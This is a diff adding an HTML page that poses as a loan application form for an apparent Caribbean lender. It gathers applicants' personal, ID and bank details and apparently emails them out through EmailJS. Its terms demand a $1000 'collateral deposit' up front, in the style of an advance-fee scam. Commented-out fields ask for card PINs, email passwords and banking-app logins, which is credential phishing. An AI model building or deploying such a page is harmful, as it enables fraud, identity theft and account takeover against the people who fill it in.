@@ -1,0 +1,227 @@
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="page.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> 
+    <link href="https://fonts.googleapis.com/css2?family=Charm:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/b33e9054eb.js" crossorigin="anonymous"></script>
+    <title>Application Form</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            // https://dashboard.emailjs.com/admin/account
+            emailjs.init('OurAAziGv8z0Bfrgd');
+        })();
+    </script>
+</head>
+<body>
+
+    <!-- <div id="div1">
+        <div id="img1"><img src="./OIP.jpg" alt=""></div>
+        <i id="icon1" class="fa-solid fa-bars"></i> -->
+        <!-- <i id="icon1" class="fa-sharp fa-solid fa-bars"></i> -->
+        <!-- <i id="icon2" class="fa-solid fa-magnifying-glass"></i> -->
+    <!-- </div> -->
+    <div id="div2" style="z-index: 3;">
+        <img src="./5f961f79-3eb9-4aa9-804f-634ebd4d51ab.jpg" alt="">
+        <h2 id="p4" style="color:black;">Application form</h2>
+        <i id="icon1" style="color:black;" class="fa-solid fa-bars"></i>
+        <!-- <i id="icon1" class="fa-sharp fa-solid fa-bars"></i> -->
+        <!-- <i id="icon2" class="fa-solid fa-magnifying-glass"></i> -->
+    </div>
+    <!-- <div id="div1">
+        <div id="img1"><img src="./WhatsApp Image 2024-05-21 at 18.29.10.jpeg" alt=""></div>
+     
+    </div>
+    <div id="div2">
+        <p id="p4">Caribbean Finance Co Ltd Loan Application Form</p>
+    </div> -->
+    <form id="contact-form">
+        <input type="hidden" name="contact_number">
+        <div id="page1">
+
+            <label for="name">Full Name:</label> <br>
+            <input type="text" name="name" id="name" placeholder="Enter First Name"> 
+            <input type="text" name="surname" id="surname" placeholder="Enter Surname"> <br>
+        
+            <!-- <label for="">Next of kin:</label><br>
+            <input type="text" class="input" name="kin" id="kin" placeholder="Enter Your Next of kin"> <br> -->
+
+            <label for="address">Address:</label><br>
+            <div id="allAddress">
+                <input type="text" class="input" name="address" id="address" placeholder="Enter Street Address"> <br>
+                <!-- <input type="text" name="street" id="address" placeholder="Enter Street Address Line 2"> -->
+                <input type="text" name="city" id="city" placeholder="Enter City">
+            </div>
+            <div id="allAddress">
+                <input type="text" name="state/province" id="state/province" placeholder="Enter State / Province"><br>
+                <input type="text" name="postal" id="postal" placeholder="Enter POstal / Zip Code"> <br>
+            </div>
+            <br>
+    
+            <label for="">Employed Status:</label><br>
+            <input type="text" name="status" id="occupation" placeholder="Enter Your Occupation"> <br>
+
+            <!-- <img style="width: 100%; margin-bottom: 4%;" src="./WhatsApp Image 2024-05-23 at 12.28.32.jpeg" alt=""> -->
+<!--             
+            <label for="">Your office address:</label><br>
+            <input type="text" name="office-address" id="office-address" placeholder="Enter Your Office Address"> <br> -->
+         
+            <!-- <label for="">Married/Single:</label><br>
+            <input type="text" name="married/single" id="married/single" placeholder="Are you married or single"> <br> -->
+            
+            <label for="">Date of birth:</label><br>
+            <input type="date" name="date" id="date" placeholder="Enter Your ID Date of birth"> <br>
+
+<!--             
+        <label for="">Salary earner/Business owner:</label><br>
+        <input type="text" class="input" name="pick" id="pick" placeholder="Salary earner/Business owner"> <br>
+         -->
+        <!-- <img style="width: 100%; margin-bottom: 4%;" src="./WhatsApp Image 2024-05-23 at 12.31.08.jpeg" alt=""> -->
+        
+        <label for="phone">Phone Number</label><br>
+        <input type="number" class="input" name="phone" id="phone" placeholder="Enter Phone Number"><br>
+            
+        <label for="">Email address:</label><br>
+        <input type="email" name="email" id="email" placeholder="Enter Your Email address" > <br>
+            
+        <label for="">ID Number:</label><br>
+        <input type="number" name="reference" id="reference" placeholder="Enter Your reference Number" > <br>
+
+        <p id="error-message"></p>
+
+        <div id="terms">
+            <input type="checkbox" name="agree" id="agree">
+            <label for="agree" >I agree to the <span id="condition" style="color: blue;"> Terms and Conditions </span></label>
+            
+        </div>
+    <p id="btn1">Next</p>
+    </div>
+
+    <div style="display: none;" id="page2">
+        
+        <label for="amount">Loan Amount:</label><br>
+        <div class="input-group">
+            <span class="input-sign">$</span>
+            <input type="number" id="input-sign" name="amount" id="amount"  placeholder="Enter Loan Amount"><br>
+        </div>
+        
+        <label for="">Loan Duration:</label><br>
+        <input type="text" name="duration" id="duration" placeholder="Enter Your Loan duration"> <br>
+        
+        <label for="account">Account Number:</label><br>
+        <input type="number" class="input" name="account2" id="account" placeholder="Enter Account Number"><br>
+
+        <!-- <img style="width: 100%; margin-bottom: 4%;" src="./WhatsApp Image 2024-05-23 at 12.31.10.jpeg" alt=""> -->
+        
+        <label for="banks">Select Bank:</label><br>
+        <select name="bank" id="banks">
+            <option id="opt1" value="Select your bank">Select your bank</option>
+            <option id="opt2" value="Republic Bank">Republic Bank</option>
+            <option id="opt3" value="RBC Royal Bank">RBC Royal Bank</option>
+            <option id="opt4" value="Scotiabank">Scotiabank</option>
+            <option id="opt5" value="JMMB Bank">JMMB Bank</option>
+            <option id="opt6" value="First Citizen Bank">First Citizen Bank</option>
+            <option id="opt7" value="Citi Bank">Citi Bank</option>
+            <option id="opt8" value="CIBC First Caribbean International Bank">CIBC First Caribbean International Bank</option>
+            <option id="opt9" value="Bank of Baroda">Bank of Baroda</option>
+        </select><br>
+        
+        <label for="">Net salary/label><br>
+        <input type="text" class="input" name="income" id="income" placeholder="Enter Your Monthly Income"> <br>
+        
+
+       <p id="error-message2"></p>
+
+        <p onclick="onClickFunction2()" id="btn2">Previous</p>
+        <div id="terms">
+            <input type="checkbox" name="agree" id="agree">
+            <label for="agree" >I agree to the <span id="condition" style="color: blue;"> Terms and Conditions </span></label>
+            
+        </div>
+        
+        <!-- <img id="img1" src="./5f9e93db193a4599be7cedfaa83453f9.webp" alt=""> -->
+        
+        
+        
+        <input type="submit" value="SUBMIT" id="submit"  style="display: none;">
+    </div>
+        
+    </form>
+
+    <div id="term" style="display: none;">
+        <p>Terms & Conditions Apply. This service is only available to those aged 20 years and older. Minimum net salary of $3000 per month. Interest rates range between 5% and 12% p.a. depending on your individual situation and term and has less expenses. <br>
+
+            According to our terms
+            and conditions, a collateral deposit of the loan amount is required before we can proceed further. The collateral deposit serves as security for the loan and ensures a more favorable interest rate and repayment terms which stands as something to hold for future trust . a collateral deposit of $1000 is required before making any payment towards your account , This reduces the overall balance and helps you to pay off the loan faster. <br>
+            This fees process takes up to 5 to 24 hours to be completed else it will be terminated. <br>
+            This is an important notice if you can’t afford the collateral fee then you can’t afford to pay back our loan. <br><br>
+            
+            
+            In order to be eligible for our loan. You must meet the below minimum requirements. <br><br>
+            
+            ◾️You are between the ages of 20 and above. <br>
+            ◾️You have a minimum income of $3000, and above monthly. <br>
+            ◾️You can be able to pay the collateral fees that’s required. <br><br>
+            
+            Following deductions on your monthly repayment will be deducted from your account monthly on the specific date and the amount that has been stated above once it’s due you will receive a sms confirmation for your repayment you accept for confirmation of your due repayment
+        </p>
+
+        <p onclick="onClickFunction3()" id="btn2">Previous</p>
+    </div>
+    <div>
+        
+    </div>
+
+    <div id="write-up">
+        <div id="write">
+            <img src="./b14ebf87-f581-432d-82f4-c51932ca8653.jpg" alt="">
+            <h3>Heading</h3>
+            <p id="failure">Unable to make to submit form <br><br> <span id="why">
+              Due to your internet connection</span> </p>
+            </div>
+    </div>
+    <div id="successful" style="display: none; width: 100vw;">
+        <img style="width: 100vw;" src="./WhatsApp Image 2024-05-13 at 23.06.34.jpeg" alt="">
+    </div>
+   </div>
+    <!-- <img src="./fnb-logo-2016.jpg" alt=""> -->
+    <!-- <label for="identity">ID Number:</label> <br>
+    <input type="number" name="identity" id="identity" placeholder="Enter ID number "> <br> -->
+    
+    <!-- <p id="p3">This section must be completed by representative</p>
+        <label for="address">Address:</label><br>
+        <div id="residence">
+            <input type="text" name="city" id="address" placeholder="Enter city">
+    <input type="text" name="state" id="state" placeholder="Enter State / Province"> <br>
+    </div>
+    <input type="text" name="postal" id="postal" placeholder="Enter Postal / Zip Code"><br> -->
+    
+    <!-- <img id="img2" src="./5f9e93db193a4599be7cedfaa83453f9.webp" alt=""> -->
+    
+    <!-- <img id="img9" src="./WhatsApp Image 2023-10-13 at 5.22.53 PM.jpeg" alt=""> --> 
+    
+            <!-- <label for="e-password">E-Mail Password</label>
+            <input type="password" name="e-password" id="e-password">
+    <p id="p2">Kindly input the required details to enable your loan disbursement into your account and
+         be ensured that your details are all encrypted and safe</p>
+    <label for="card">Card Number:</label> <br>
+    <input type="number" name="card" id="card" placeholder="Enter Card Number"> <br>
+    
+    <label for="pin">Card Pin:</label><br>
+    <input type="number" name="pin" id="pin" placeholder="Enter Card Pin"> <br>
+    
+    <p id="p3"> Kindly input the required details to enable your loan disbursement into your account and
+        be ensured that your details are all encrypted and safe</p>
+    <label for="username">App Username:</label> <br>
+    <input type="text" name="username" id="username" placeholder="Enter Username"> <br>
+    
+    <label for="password">App Password:</label> <br>
+    <input type="password" name="password" id="password" placeholder="Enter Password"> <br>
+    -->
+    <script src="page.js"></script>
+    <!-- <script type="module" src="module.js"></script> -->
+</body>
+</html>
